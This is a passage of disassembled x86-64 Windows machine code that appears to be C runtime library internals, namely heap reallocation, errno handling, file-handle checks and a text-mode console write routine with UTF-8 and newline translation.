   14000bec7:	48 8d 4c 24 50       	lea    0x50(%rsp),%rcx
   14000becc:	e8 1f 99 ff ff       	call   0x1400057f0
   14000bed1:	8b 84 24 c0 00 00 00 	mov    0xc0(%rsp),%eax
   14000bed8:	48 8d 4c 24 58       	lea    0x58(%rsp),%rcx
   14000bedd:	89 44 24 40          	mov    %eax,0x40(%rsp)
   14000bee1:	4c 8b cb             	mov    %rbx,%r9
   14000bee4:	8b 84 24 b8 00 00 00 	mov    0xb8(%rsp),%eax
   14000beeb:	44 8b c7             	mov    %edi,%r8d
   14000beee:	89 44 24 38          	mov    %eax,0x38(%rsp)
   14000bef2:	48 8b d6             	mov    %rsi,%rdx
   14000bef5:	8b 84 24 b0 00 00 00 	mov    0xb0(%rsp),%eax
   14000befc:	89 44 24 30          	mov    %eax,0x30(%rsp)
   14000bf00:	48 8b 84 24 a8 00 00 	mov    0xa8(%rsp),%rax
   14000bf07:	00 
   14000bf08:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
   14000bf0d:	8b 84 24 a0 00 00 00 	mov    0xa0(%rsp),%eax
   14000bf14:	89 44 24 20          	mov    %eax,0x20(%rsp)
   14000bf18:	e8 77 fc ff ff       	call   0x14000bb94
   14000bf1d:	80 7c 24 68 00       	cmpb   $0x0,0x68(%rsp)
   14000bf22:	74 0c                	je     0x14000bf30
   14000bf24:	48 8b 4c 24 50       	mov    0x50(%rsp),%rcx
   14000bf29:	83 a1 a8 03 00 00 fd 	andl   $0xfffffffd,0x3a8(%rcx)
   14000bf30:	4c 8d 5c 24 70       	lea    0x70(%rsp),%r11
   14000bf35:	49 8b 5b 10          	mov    0x10(%r11),%rbx
   14000bf39:	49 8b 73 18          	mov    0x18(%r11),%rsi
   14000bf3d:	49 8b e3             	mov    %r11,%rsp
   14000bf40:	5f                   	pop    %rdi
   14000bf41:	c3                   	ret
   14000bf42:	cc                   	int3
   14000bf43:	cc                   	int3
   14000bf44:	48 83 ec 28          	sub    $0x28,%rsp
   14000bf48:	e8 33 d3 ff ff       	call   0x140009280
   14000bf4d:	33 c9                	xor    %ecx,%ecx
   14000bf4f:	84 c0                	test   %al,%al
   14000bf51:	0f 94 c1             	sete   %cl
   14000bf54:	8b c1                	mov    %ecx,%eax
   14000bf56:	48 83 c4 28          	add    $0x28,%rsp
   14000bf5a:	c3                   	ret
   14000bf5b:	cc                   	int3
   14000bf5c:	48 83 ec 28          	sub    $0x28,%rsp
   14000bf60:	48 85 c9             	test   %rcx,%rcx
   14000bf63:	75 19                	jne    0x14000bf7e
   14000bf65:	e8 d6 b7 ff ff       	call   0x140007740
   14000bf6a:	c7 00 16 00 00 00    	movl   $0x16,(%rax)
   14000bf70:	e8 ab b6 ff ff       	call   0x140007620
   14000bf75:	48 83 c8 ff          	or     $0xffffffffffffffff,%rax
   14000bf79:	48 83 c4 28          	add    $0x28,%rsp
   14000bf7d:	c3                   	ret
   14000bf7e:	4c 8b c1             	mov    %rcx,%r8
   14000bf81:	33 d2                	xor    %edx,%edx
   14000bf83:	48 8b 0d 56 fc 00 00 	mov    0xfc56(%rip),%rcx        # 0x14001bbe0
   14000bf8a:	48 83 c4 28          	add    $0x28,%rsp
   14000bf8e:	48 ff 25 db 32 00 00 	rex.W jmp *0x32db(%rip)        # 0x14000f270
   14000bf95:	cc                   	int3
   14000bf96:	cc                   	int3
   14000bf97:	cc                   	int3
   14000bf98:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   14000bf9d:	57                   	push   %rdi
   14000bf9e:	48 83 ec 20          	sub    $0x20,%rsp
   14000bfa2:	48 8b da             	mov    %rdx,%rbx
   14000bfa5:	48 8b f9             	mov    %rcx,%rdi
   14000bfa8:	48 85 c9             	test   %rcx,%rcx
   14000bfab:	75 0a                	jne    0x14000bfb7
   14000bfad:	48 8b ca             	mov    %rdx,%rcx
   14000bfb0:	e8 93 be ff ff       	call   0x140007e48
   14000bfb5:	eb 1f                	jmp    0x14000bfd6
   14000bfb7:	48 85 db             	test   %rbx,%rbx
   14000bfba:	75 07                	jne    0x14000bfc3
   14000bfbc:	e8 5f bf ff ff       	call   0x140007f20
   14000bfc1:	eb 11                	jmp    0x14000bfd4
   14000bfc3:	48 83 fb e0          	cmp    $0xffffffffffffffe0,%rbx
   14000bfc7:	76 2d                	jbe    0x14000bff6
   14000bfc9:	e8 72 b7 ff ff       	call   0x140007740
   14000bfce:	c7 00 0c 00 00 00    	movl   $0xc,(%rax)
   14000bfd4:	33 c0                	xor    %eax,%eax
   14000bfd6:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   14000bfdb:	48 83 c4 20          	add    $0x20,%rsp
   14000bfdf:	5f                   	pop    %rdi
   14000bfe0:	c3                   	ret
   14000bfe1:	e8 a6 a6 ff ff       	call   0x14000668c
   14000bfe6:	85 c0                	test   %eax,%eax
   14000bfe8:	74 df                	je     0x14000bfc9
   14000bfea:	48 8b cb             	mov    %rbx,%rcx
   14000bfed:	e8 ee 98 ff ff       	call   0x1400058e0
   14000bff2:	85 c0                	test   %eax,%eax
   14000bff4:	74 d3                	je     0x14000bfc9
   14000bff6:	48 8b 0d e3 fb 00 00 	mov    0xfbe3(%rip),%rcx        # 0x14001bbe0
   14000bffd:	4c 8b cb             	mov    %rbx,%r9
   14000c000:	4c 8b c7             	mov    %rdi,%r8
   14000c003:	33 d2                	xor    %edx,%edx
   14000c005:	ff 15 5d 32 00 00    	call   *0x325d(%rip)        # 0x14000f268
   14000c00b:	48 85 c0             	test   %rax,%rax
   14000c00e:	74 d1                	je     0x14000bfe1
   14000c010:	eb c4                	jmp    0x14000bfd6
   14000c012:	cc                   	int3
   14000c013:	cc                   	int3
   14000c014:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   14000c019:	4c 89 4c 24 20       	mov    %r9,0x20(%rsp)
   14000c01e:	57                   	push   %rdi
   14000c01f:	48 83 ec 20          	sub    $0x20,%rsp
   14000c023:	49 8b f9             	mov    %r9,%rdi
   14000c026:	49 8b d8             	mov    %r8,%rbx
   14000c029:	8b 0a                	mov    (%rdx),%ecx
   14000c02b:	e8 28 da ff ff       	call   0x140009a58
   14000c030:	90                   	nop
   14000c031:	48 8b 03             	mov    (%rbx),%rax
   14000c034:	48 63 08             	movslq (%rax),%rcx
   14000c037:	48 8b d1             	mov    %rcx,%rdx
   14000c03a:	48 8b c1             	mov    %rcx,%rax
   14000c03d:	48 c1 f8 06          	sar    $0x6,%rax
   14000c041:	4c 8d 05 88 f7 00 00 	lea    0xf788(%rip),%r8        # 0x14001b7d0
   14000c048:	83 e2 3f             	and    $0x3f,%edx
   14000c04b:	48 8d 14 d2          	lea    (%rdx,%rdx,8),%rdx
   14000c04f:	49 8b 04 c0          	mov    (%r8,%rax,8),%rax
   14000c053:	f6 44 d0 38 01       	testb  $0x1,0x38(%rax,%rdx,8)
   14000c058:	74 24                	je     0x14000c07e
   14000c05a:	e8 05 db ff ff       	call   0x140009b64
   14000c05f:	48 8b c8             	mov    %rax,%rcx
   14000c062:	ff 15 f8 31 00 00    	call   *0x31f8(%rip)        # 0x14000f260
   14000c068:	33 db                	xor    %ebx,%ebx
   14000c06a:	85 c0                	test   %eax,%eax
   14000c06c:	75 1e                	jne    0x14000c08c
   14000c06e:	e8 ad b6 ff ff       	call   0x140007720
   14000c073:	48 8b d8             	mov    %rax,%rbx
   14000c076:	ff 15 54 30 00 00    	call   *0x3054(%rip)        # 0x14000f0d0
   14000c07c:	89 03                	mov    %eax,(%rbx)
   14000c07e:	e8 bd b6 ff ff       	call   0x140007740
   14000c083:	c7 00 09 00 00 00    	movl   $0x9,(%rax)
   14000c089:	83 cb ff             	or     $0xffffffff,%ebx
   14000c08c:	8b 0f                	mov    (%rdi),%ecx
   14000c08e:	e8 ed d9 ff ff       	call   0x140009a80
   14000c093:	8b c3                	mov    %ebx,%eax
   14000c095:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   14000c09a:	48 83 c4 20          	add    $0x20,%rsp
   14000c09e:	5f                   	pop    %rdi
   14000c09f:	c3                   	ret
   14000c0a0:	89 4c 24 08          	mov    %ecx,0x8(%rsp)
   14000c0a4:	48 83 ec 38          	sub    $0x38,%rsp
   14000c0a8:	48 63 d1             	movslq %ecx,%rdx
   14000c0ab:	83 fa fe             	cmp    $0xfffffffe,%edx
   14000c0ae:	75 0d                	jne    0x14000c0bd
   14000c0b0:	e8 8b b6 ff ff       	call   0x140007740
   14000c0b5:	c7 00 09 00 00 00    	movl   $0x9,(%rax)
   14000c0bb:	eb 6c                	jmp    0x14000c129
   14000c0bd:	85 c9                	test   %ecx,%ecx
   14000c0bf:	78 58                	js     0x14000c119
   14000c0c1:	3b 15 09 fb 00 00    	cmp    0xfb09(%rip),%edx        # 0x14001bbd0
   14000c0c7:	73 50                	jae    0x14000c119
   14000c0c9:	48 8b ca             	mov    %rdx,%rcx
   14000c0cc:	4c 8d 05 fd f6 00 00 	lea    0xf6fd(%rip),%r8        # 0x14001b7d0
   14000c0d3:	83 e1 3f             	and    $0x3f,%ecx
   14000c0d6:	48 8b c2             	mov    %rdx,%rax
   14000c0d9:	48 c1 f8 06          	sar    $0x6,%rax
   14000c0dd:	48 8d 0c c9          	lea    (%rcx,%rcx,8),%rcx
   14000c0e1:	49 8b 04 c0          	mov    (%r8,%rax,8),%rax
   14000c0e5:	f6 44 c8 38 01       	testb  $0x1,0x38(%rax,%rcx,8)
   14000c0ea:	74 2d                	je     0x14000c119
   14000c0ec:	48 8d 44 24 40       	lea    0x40(%rsp),%rax
   14000c0f1:	89 54 24 50          	mov    %edx,0x50(%rsp)
   14000c0f5:	89 54 24 58          	mov    %edx,0x58(%rsp)
   14000c0f9:	4c 8d 4c 24 50       	lea    0x50(%rsp),%r9
   14000c0fe:	48 8d 54 24 58       	lea    0x58(%rsp),%rdx
   14000c103:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   14000c108:	4c 8d 44 24 20       	lea    0x20(%rsp),%r8
   14000c10d:	48 8d 4c 24 48       	lea    0x48(%rsp),%rcx
   14000c112:	e8 fd fe ff ff       	call   0x14000c014
   14000c117:	eb 13                	jmp    0x14000c12c
   14000c119:	e8 22 b6 ff ff       	call   0x140007740
   14000c11e:	c7 00 09 00 00 00    	movl   $0x9,(%rax)
   14000c124:	e8 f7 b4 ff ff       	call   0x140007620
   14000c129:	83 c8 ff             	or     $0xffffffff,%eax
   14000c12c:	48 83 c4 38          	add    $0x38,%rsp
   14000c130:	c3                   	ret
   14000c131:	cc                   	int3
   14000c132:	cc                   	int3
   14000c133:	cc                   	int3
   14000c134:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   14000c139:	55                   	push   %rbp
   14000c13a:	56                   	push   %rsi
   14000c13b:	57                   	push   %rdi
   14000c13c:	41 54                	push   %r12
   14000c13e:	41 55                	push   %r13
   14000c140:	41 56                	push   %r14
   14000c142:	41 57                	push   %r15
   14000c144:	48 8d 6c 24 d9       	lea    -0x27(%rsp),%rbp
   14000c149:	48 81 ec 00 01 00 00 	sub    $0x100,%rsp
   14000c150:	48 8b 05 a9 de 00 00 	mov    0xdea9(%rip),%rax        # 0x14001a000
   14000c157:	48 33 c4             	xor    %rsp,%rax
   14000c15a:	48 89 45 17          	mov    %rax,0x17(%rbp)
   14000c15e:	48 63 f2             	movslq %edx,%rsi
   14000c161:	4d 8b f8             	mov    %r8,%r15
   14000c164:	48 8b c6             	mov    %rsi,%rax
   14000c167:	48 89 4d f7          	mov    %rcx,-0x9(%rbp)
   14000c16b:	48 89 45 ef          	mov    %rax,-0x11(%rbp)
   14000c16f:	48 8d 0d 8a 3e ff ff 	lea    -0xc176(%rip),%rcx        # 0x140000000
   14000c176:	83 e0 3f             	and    $0x3f,%eax
   14000c179:	45 8b e9             	mov    %r9d,%r13d
   14000c17c:	4d 03 e8             	add    %r8,%r13
   14000c17f:	4c 89 45 df          	mov    %r8,-0x21(%rbp)
   14000c183:	4c 8b e6             	mov    %rsi,%r12
   14000c186:	4c 89 6d af          	mov    %r13,-0x51(%rbp)
   14000c18a:	49 c1 fc 06          	sar    $0x6,%r12
   14000c18e:	4c 8d 34 c0          	lea    (%rax,%rax,8),%r14
   14000c192:	4a 8b 84 e1 d0 b7 01 	mov    0x1b7d0(%rcx,%r12,8),%rax
   14000c199:	00 
   14000c19a:	4a 8b 44 f0 28       	mov    0x28(%rax,%r14,8),%rax
   14000c19f:	48 89 45 b7          	mov    %rax,-0x49(%rbp)
   14000c1a3:	ff 15 af 30 00 00    	call   *0x30af(%rip)        # 0x14000f258
   14000c1a9:	33 d2                	xor    %edx,%edx
   14000c1ab:	48 8d 4c 24 50       	lea    0x50(%rsp),%rcx
   14000c1b0:	89 45 a7             	mov    %eax,-0x59(%rbp)
   14000c1b3:	e8 38 96 ff ff       	call   0x1400057f0
   14000c1b8:	48 8b 4c 24 58       	mov    0x58(%rsp),%rcx
   14000c1bd:	45 33 db             	xor    %r11d,%r11d
   14000c1c0:	44 89 5d 97          	mov    %r11d,-0x69(%rbp)
   14000c1c4:	41 8b db             	mov    %r11d,%ebx
   14000c1c7:	89 5d 9b             	mov    %ebx,-0x65(%rbp)
   14000c1ca:	49 8b ff             	mov    %r15,%rdi
   14000c1cd:	8b 51 0c             	mov    0xc(%rcx),%edx
   14000c1d0:	41 8b cb             	mov    %r11d,%ecx
   14000c1d3:	89 4c 24 40          	mov    %ecx,0x40(%rsp)
   14000c1d7:	89 55 ab             	mov    %edx,-0x55(%rbp)
   14000c1da:	4d 3b fd             	cmp    %r13,%r15
   14000c1dd:	0f 83 e2 03 00 00    	jae    0x14000c5c5
   14000c1e3:	48 8b c6             	mov    %rsi,%rax
   14000c1e6:	49 8b f7             	mov    %r15,%rsi
   14000c1e9:	48 c1 f8 06          	sar    $0x6,%rax
   14000c1ed:	48 89 45 e7          	mov    %rax,-0x19(%rbp)
   14000c1f1:	8a 0f                	mov    (%rdi),%cl
   14000c1f3:	41 bf 01 00 00 00    	mov    $0x1,%r15d
   14000c1f9:	88 4c 24 44          	mov    %cl,0x44(%rsp)
   14000c1fd:	44 89 5c 24 48       	mov    %r11d,0x48(%rsp)
   14000c202:	81 fa e9 fd 00 00    	cmp    $0xfde9,%edx
   14000c208:	0f 85 70 01 00 00    	jne    0x14000c37e
   14000c20e:	4c 8d 3d eb 3d ff ff 	lea    -0xc215(%rip),%r15        # 0x140000000
   14000c215:	41 8b d3             	mov    %r11d,%edx
   14000c218:	4d 8b 8c c7 d0 b7 01 	mov    0x1b7d0(%r15,%rax,8),%r9
   14000c21f:	00 
   14000c220:	49 8b f3             	mov    %r11,%rsi
   14000c223:	4b 8d 04 f1          	lea    (%r9,%r14,8),%rax
   14000c227:	44 38 5c 30 3e       	cmp    %r11b,0x3e(%rax,%rsi,1)
   14000c22c:	74 0b                	je     0x14000c239
   14000c22e:	ff c2                	inc    %edx
   14000c230:	48 ff c6             	inc    %rsi
   14000c233:	48 83 fe 05          	cmp    $0x5,%rsi
   14000c237:	7c ee                	jl     0x14000c227
   14000c239:	48 85 f6             	test   %rsi,%rsi
   14000c23c:	0f 8e e0 00 00 00    	jle    0x14000c322
   14000c242:	4b 8b 84 e7 d0 b7 01 	mov    0x1b7d0(%r15,%r12,8),%rax
   14000c249:	00 
   14000c24a:	4c 8b 45 af          	mov    -0x51(%rbp),%r8
   14000c24e:	4c 2b c7             	sub    %rdi,%r8
   14000c251:	42 0f b6 4c f0 3e    	movzbl 0x3e(%rax,%r14,8),%ecx
   14000c257:	46 0f be bc 39 d0 a8 	movsbl 0x1a8d0(%rcx,%r15,1),%r15d
   14000c25e:	01 00 
   14000c260:	41 ff c7             	inc    %r15d
   14000c263:	45 8b ef             	mov    %r15d,%r13d
   14000c266:	44 2b ea             	sub    %edx,%r13d
   14000c269:	4d 63 d5             	movslq %r13d,%r10
   14000c26c:	4d 3b d0             	cmp    %r8,%r10
   14000c26f:	0f 8f 78 02 00 00    	jg     0x14000c4ed
   14000c275:	48 8d 45 ff          	lea    -0x1(%rbp),%rax
   14000c279:	49 8b d3             	mov    %r11,%rdx
   14000c27c:	4c 2b c8             	sub    %rax,%r9
   14000c27f:	4f 8d 04 f1          	lea    (%r9,%r14,8),%r8
   14000c283:	48 8d 4d ff          	lea    -0x1(%rbp),%rcx
   14000c287:	48 03 ca             	add    %rdx,%rcx
   14000c28a:	48 ff c2             	inc    %rdx
   14000c28d:	42 8a 44 01 3e       	mov    0x3e(%rcx,%r8,1),%al
   14000c292:	88 01                	mov    %al,(%rcx)
   14000c294:	48 3b d6             	cmp    %rsi,%rdx
   14000c297:	7c ea                	jl     0x14000c283
   14000c299:	45 85 ed             	test   %r13d,%r13d
   14000c29c:	7e 15                	jle    0x14000c2b3
   14000c29e:	48 8d 4d ff          	lea    -0x1(%rbp),%rcx
   14000c2a2:	4d 8b c2             	mov    %r10,%r8
   14000c2a5:	48 03 ce             	add    %rsi,%rcx
   14000c2a8:	48 8b d7             	mov    %rdi,%rdx
   14000c2ab:	e8 30 8d ff ff       	call   0x140004fe0
   14000c2b0:	45 33 db             	xor    %r11d,%r11d
   14000c2b3:	49 8b d3             	mov    %r11,%rdx
   14000c2b6:	4c 8d 05 43 3d ff ff 	lea    -0xc2bd(%rip),%r8        # 0x140000000
   14000c2bd:	4b 8b 8c e0 d0 b7 01 	mov    0x1b7d0(%r8,%r12,8),%rcx
   14000c2c4:	00 
   14000c2c5:	48 03 ca             	add    %rdx,%rcx
   14000c2c8:	48 ff c2             	inc    %rdx
   14000c2cb:	46 88 5c f1 3e       	mov    %r11b,0x3e(%rcx,%r14,8)
   14000c2d0:	48 3b d6             	cmp    %rsi,%rdx
   14000c2d3:	7c e8                	jl     0x14000c2bd
   14000c2d5:	48 8d 45 ff          	lea    -0x1(%rbp),%rax
   14000c2d9:	4c 89 5d bf          	mov    %r11,-0x41(%rbp)
   14000c2dd:	48 89 45 c7          	mov    %rax,-0x39(%rbp)
   14000c2e1:	4c 8d 4d bf          	lea    -0x41(%rbp),%r9
   14000c2e5:	41 8b c3             	mov    %r11d,%eax
   14000c2e8:	48 8d 55 c7          	lea    -0x39(%rbp),%rdx
   14000c2ec:	41 83 ff 04          	cmp    $0x4,%r15d
   14000c2f0:	48 8d 4c 24 48       	lea    0x48(%rsp),%rcx
   14000c2f5:	0f 94 c0             	sete   %al
   14000c2f8:	ff c0                	inc    %eax
   14000c2fa:	44 8b c0             	mov    %eax,%r8d
   14000c2fd:	44 8b f8             	mov    %eax,%r15d
   14000c300:	e8 57 0c 00 00       	call   0x14000cf5c
   14000c305:	48 83 f8 ff          	cmp    $0xffffffffffffffff,%rax
   14000c309:	0f 84 d7 00 00 00    	je     0x14000c3e6
   14000c30f:	41 8d 45 ff          	lea    -0x1(%r13),%eax
   14000c313:	4c 8b 6d af          	mov    -0x51(%rbp),%r13
   14000c317:	48 63 f0             	movslq %eax,%rsi
   14000c31a:	48 03 f7             	add    %rdi,%rsi
   14000c31d:	e9 e6 00 00 00       	jmp    0x14000c408
   14000c322:	0f b6 07             	movzbl (%rdi),%eax
   14000c325:	49 8b d5             	mov    %r13,%rdx
   14000c328:	48 2b d7             	sub    %rdi,%rdx
   14000c32b:	4a 0f be b4 38 d0 a8 	movsbq 0x1a8d0(%rax,%r15,1),%rsi
   14000c332:	01 00 
   14000c334:	8d 4e 01             	lea    0x1(%rsi),%ecx
   14000c337:	48 63 c1             	movslq %ecx,%rax
   14000c33a:	48 3b c2             	cmp    %rdx,%rax
   14000c33d:	0f 8f e4 01 00 00    	jg     0x14000c527
   14000c343:	83 f9 04             	cmp    $0x4,%ecx
   14000c346:	4c 89 5d cf          	mov    %r11,-0x31(%rbp)
   14000c34a:	41 8b c3             	mov    %r11d,%eax
   14000c34d:	48 89 7d d7          	mov    %rdi,-0x29(%rbp)
   14000c351:	0f 94 c0             	sete   %al
   14000c354:	4c 8d 4d cf          	lea    -0x31(%rbp),%r9
   14000c358:	ff c0                	inc    %eax
   14000c35a:	48 8d 55 d7          	lea    -0x29(%rbp),%rdx
   14000c35e:	44 8b c0             	mov    %eax,%r8d
   14000c361:	48 8d 4c 24 48       	lea    0x48(%rsp),%rcx
   14000c366:	8b d8                	mov    %eax,%ebx
   14000c368:	e8 ef 0b 00 00       	call   0x14000cf5c
   14000c36d:	48 83 f8 ff          	cmp    $0xffffffffffffffff,%rax
   14000c371:	74 73                	je     0x14000c3e6
   14000c373:	48 03 f7             	add    %rdi,%rsi
   14000c376:	44 8b fb             	mov    %ebx,%r15d
   14000c379:	e9 8a 00 00 00       	jmp    0x14000c408
   14000c37e:	48 8d 05 7b 3c ff ff 	lea    -0xc385(%rip),%rax        # 0x140000000
   14000c385:	4a 8b 94 e0 d0 b7 01 	mov    0x1b7d0(%rax,%r12,8),%rdx
   14000c38c:	00 
   14000c38d:	42 8a 4c f2 3d       	mov    0x3d(%rdx,%r14,8),%cl
   14000c392:	f6 c1 04             	test   $0x4,%cl
   14000c395:	74 1b                	je     0x14000c3b2
   14000c397:	42 8a 44 f2 3e       	mov    0x3e(%rdx,%r14,8),%al
   14000c39c:	80 e1 fb             	and    $0xfb,%cl
   14000c39f:	88 45 07             	mov    %al,0x7(%rbp)
   14000c3a2:	8a 07                	mov    (%rdi),%al
   14000c3a4:	42 88 4c f2 3d       	mov    %cl,0x3d(%rdx,%r14,8)
   14000c3a9:	48 8d 55 07          	lea    0x7(%rbp),%rdx
   14000c3ad:	88 45 08             	mov    %al,0x8(%rbp)
   14000c3b0:	eb 1f                	jmp    0x14000c3d1
   14000c3b2:	e8 a9 b9 ff ff       	call   0x140007d60
   14000c3b7:	0f b6 0f             	movzbl (%rdi),%ecx
   14000c3ba:	33 d2                	xor    %edx,%edx
   14000c3bc:	66 39 14 48          	cmp    %dx,(%rax,%rcx,2)
   14000c3c0:	7d 2d                	jge    0x14000c3ef
   14000c3c2:	48 ff c6             	inc    %rsi
   14000c3c5:	49 3b f5             	cmp    %r13,%rsi
   14000c3c8:	0f 83 b2 01 00 00    	jae    0x14000c580
   14000c3ce:	48 8b d7             	mov    %rdi,%rdx
   14000c3d1:	41 b8 02 00 00 00    	mov    $0x2,%r8d
   14000c3d7:	48 8d 4c 24 48       	lea    0x48(%rsp),%rcx
   14000c3dc:	e8 43 ed ff ff       	call   0x14000b124
   14000c3e1:	83 f8 ff             	cmp    $0xffffffff,%eax
   14000c3e4:	75 22                	jne    0x14000c408
   14000c3e6:	80 7d 8f 00          	cmpb   $0x0,-0x71(%rbp)
   14000c3ea:	e9 8b 01 00 00       	jmp    0x14000c57a
   14000c3ef:	4d 8b c7             	mov    %r15,%r8
   14000c3f2:	48 8d 4c 24 48       	lea    0x48(%rsp),%rcx
   14000c3f7:	48 8b d7             	mov    %rdi,%rdx
   14000c3fa:	e8 25 ed ff ff       	call   0x14000b124
   14000c3ff:	83 f8 ff             	cmp    $0xffffffff,%eax
   14000c402:	0f 84 af 01 00 00    	je     0x14000c5b7
   14000c408:	8b 4d a7             	mov    -0x59(%rbp),%ecx
   14000c40b:	48 8d 45 0f          	lea    0xf(%rbp),%rax
   14000c40f:	33 db                	xor    %ebx,%ebx
   14000c411:	4c 8d 44 24 48       	lea    0x48(%rsp),%r8
   14000c416:	48 89 5c 24 38       	mov    %rbx,0x38(%rsp)
   14000c41b:	48 8d 7e 01          	lea    0x1(%rsi),%rdi
   14000c41f:	48 89 5c 24 30       	mov    %rbx,0x30(%rsp)
   14000c424:	45 8b cf             	mov    %r15d,%r9d
   14000c427:	c7 44 24 28 05 00 00 	movl   $0x5,0x28(%rsp)
   14000c42e:	00 
   14000c42f:	33 d2                	xor    %edx,%edx
   14000c431:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   14000c436:	e8 8d d2 ff ff       	call   0x1400096c8
   14000c43b:	8b f0                	mov    %eax,%esi
   14000c43d:	85 c0                	test   %eax,%eax
   14000c43f:	0f 84 d2 01 00 00    	je     0x14000c617
   14000c445:	48 8b 4d b7          	mov    -0x49(%rbp),%rcx
   14000c449:	4c 8d 4c 24 4c       	lea    0x4c(%rsp),%r9
   14000c44e:	44 8b c0             	mov    %eax,%r8d
   14000c451:	48 89 5c 24 20       	mov    %rbx,0x20(%rsp)
   14000c456:	48 8d 55 0f          	lea    0xf(%rbp),%rdx
   14000c45a:	ff 15 d0 2d 00 00    	call   *0x2dd0(%rip)        # 0x14000f230
   14000c460:	45 33 db             	xor    %r11d,%r11d
   14000c463:	85 c0                	test   %eax,%eax
   14000c465:	0f 84 a3 01 00 00    	je     0x14000c60e
   14000c46b:	44 8b 7c 24 40       	mov    0x40(%rsp),%r15d
   14000c470:	8b df                	mov    %edi,%ebx
   14000c472:	2b 5d df             	sub    -0x21(%rbp),%ebx
   14000c475:	41 03 df             	add    %r15d,%ebx
   14000c478:	89 5d 9b             	mov    %ebx,-0x65(%rbp)
   14000c47b:	39 74 24 4c          	cmp    %esi,0x4c(%rsp)
   14000c47f:	0f 82 f1 00 00 00    	jb     0x14000c576
   14000c485:	80 7c 24 44 0a       	cmpb   $0xa,0x44(%rsp)
   14000c48a:	75 49                	jne    0x14000c4d5
   14000c48c:	48 8b 4d b7          	mov    -0x49(%rbp),%rcx
   14000c490:	41 8d 43 0d          	lea    0xd(%r11),%eax
   14000c494:	4c 8d 4c 24 4c       	lea    0x4c(%rsp),%r9
   14000c499:	66 89 44 24 44       	mov    %ax,0x44(%rsp)
   14000c49e:	45 8d 43 01          	lea    0x1(%r11),%r8d
   14000c4a2:	4c 89 5c 24 20       	mov    %r11,0x20(%rsp)
   14000c4a7:	48 8d 54 24 44       	lea    0x44(%rsp),%rdx
   14000c4ac:	ff 15 7e 2d 00 00    	call   *0x2d7e(%rip)        # 0x14000f230
   14000c4b2:	45 33 db             	xor    %r11d,%r11d
   14000c4b5:	85 c0                	test   %eax,%eax
   14000c4b7:	0f 84 f1 00 00 00    	je     0x14000c5ae
   14000c4bd:	83 7c 24 4c 01       	cmpl   $0x1,0x4c(%rsp)
   14000c4c2:	0f 82 ae 00 00 00    	jb     0x14000c576
   14000c4c8:	41 ff c7             	inc    %r15d
   14000c4cb:	ff c3                	inc    %ebx
   14000c4cd:	44 89 7c 24 40       	mov    %r15d,0x40(%rsp)
   14000c4d2:	89 5d 9b             	mov    %ebx,-0x65(%rbp)
   14000c4d5:	48 8b f7             	mov    %rdi,%rsi
   14000c4d8:	49 3b fd             	cmp    %r13,%rdi
   14000c4db:	0f 83 e0 00 00 00    	jae    0x14000c5c1
   14000c4e1:	48 8b 45 e7          	mov    -0x19(%rbp),%rax
   14000c4e5:	8b 55 ab             	mov    -0x55(%rbp),%edx
   14000c4e8:	e9 04 fd ff ff       	jmp    0x14000c1f1
   14000c4ed:	41 8b d3             	mov    %r11d,%edx
   14000c4f0:	4d 85 c0             	test   %r8,%r8
   14000c4f3:	7e 2d                	jle    0x14000c522
   14000c4f5:	48 2b fe             	sub    %rsi,%rdi
   14000c4f8:	48 8d 1d 01 3b ff ff 	lea    -0xc4ff(%rip),%rbx        # 0x140000000
   14000c4ff:	8a 04 37             	mov    (%rdi,%rsi,1),%al
   14000c502:	ff c2                	inc    %edx
   14000c504:	4a 8b 8c e3 d0 b7 01 	mov    0x1b7d0(%rbx,%r12,8),%rcx
   14000c50b:	00 
   14000c50c:	48 03 ce             	add    %rsi,%rcx
   14000c50f:	48 ff c6             	inc    %rsi
   14000c512:	42 88 44 f1 3e       	mov    %al,0x3e(%rcx,%r14,8)
   14000c517:	48 63 c2             	movslq %edx,%rax
   14000c51a:	49 3b c0             	cmp    %r8,%rax
   14000c51d:	7c e0                	jl     0x14000c4ff
   14000c51f:	8b 5d 9b             	mov    -0x65(%rbp),%ebx
   14000c522:	41 03 d8             	add    %r8d,%ebx
   14000c525:	eb 4c                	jmp    0x14000c573
   14000c527:	45 8b cb             	mov    %r11d,%r9d
   14000c52a:	48 85 d2             	test   %rdx,%rdx
   14000c52d:	7e 42                	jle    0x14000c571
   14000c52f:	4c 8b 6d ef          	mov    -0x11(%rbp),%r13
   14000c533:	4d 8b c3             	mov    %r11,%r8
   14000c536:	4d 8b d5             	mov    %r13,%r10
   14000c539:	41 83 e5 3f          	and    $0x3f,%r13d
   14000c53d:	49 c1 fa 06          	sar    $0x6,%r10
   14000c541:	4e 8d 1c ed 00 00 00 	lea    0x0(,%r13,8),%r11
   14000c548:	00 
   14000c549:	4d 03 dd             	add    %r13,%r11
   14000c54c:	41 8a 04 38          	mov    (%r8,%rdi,1),%al
   14000c550:	41 ff c1             	inc    %r9d
   14000c553:	4b 8b 8c d7 d0 b7 01 	mov    0x1b7d0(%r15,%r10,8),%rcx
   14000c55a:	00 
   14000c55b:	49 03 c8             	add    %r8,%rcx
   14000c55e:	49 ff c0             	inc    %r8
   14000c561:	42 88 44 d9 3e       	mov    %al,0x3e(%rcx,%r11,8)
   14000c566:	49 63 c1             	movslq %r9d,%rax
   14000c569:	48 3b c2             	cmp    %rdx,%rax
   14000c56c:	7c de                	jl     0x14000c54c
   14000c56e:	45 33 db             	xor    %r11d,%r11d
   14000c571:	03 da                	add    %edx,%ebx
   14000c573:	89 5d 9b             	mov    %ebx,-0x65(%rbp)
   14000c576:	44 38 5d 8f          	cmp    %r11b,-0x71(%rbp)
   14000c57a:	8b 4c 24 40          	mov    0x40(%rsp),%ecx
   14000c57e:	eb 49                	jmp    0x14000c5c9
   14000c580:	8a 07                	mov    (%rdi),%al
   14000c582:	4c 8d 05 77 3a ff ff 	lea    -0xc589(%rip),%r8        # 0x140000000
   14000c589:	4b 8b 8c e0 d0 b7 01 	mov    0x1b7d0(%r8,%r12,8),%rcx
   14000c590:	00 
   14000c591:	ff c3                	inc    %ebx
   14000c593:	89 5d 9b             	mov    %ebx,-0x65(%rbp)
